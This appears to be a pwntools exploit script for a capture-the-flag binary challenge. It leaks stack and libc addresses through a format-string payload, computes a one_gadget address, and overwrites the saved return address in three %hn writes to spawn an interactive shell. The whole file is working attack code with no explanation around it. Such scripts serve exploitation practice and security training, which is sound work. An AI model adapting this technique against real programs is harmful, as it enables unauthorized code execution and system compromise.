#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*vuln+126

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

load = b'%12$p%17$p'

s(b'aa' + b'\0'*22)


sa(b'\n' ,load)
p.recvuntil(b': ')

leak = p.recvline()[:-1].split(b'0x')
print(f'leak: {leak}')
stack_leak = int(leak[1], 16)
libc_leak = int(leak[2], 16)
libc.address = libc_leak - 0x276c1

info(f'stack leak: {hex(stack_leak)}')
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')
one = libc.address + 0xe5830
rip = stack_leak - 0x18

#######$ 1 #############
load = flat(
    f'%{one & 0xffff}c%10$hn'
)
# 10$
load = load.ljust(0x10, b'a')
load += p64(rip)

s(load)

######### 2 ############
load = flat(
    f'%{one >> 16 & 0xffff}c%10$hn'
)
load = load.ljust(0x10, b'a')
load += p64(rip + 2)

s(load)

######### 3 #############
load = flat(
    f'%{one >> 32 & 0xffff}c%10$hn'
)
# 10$
load = load.ljust(0x10, b'a')
load += p64(rip + 4)

s(load)
s(b'\n')
p.interactive()
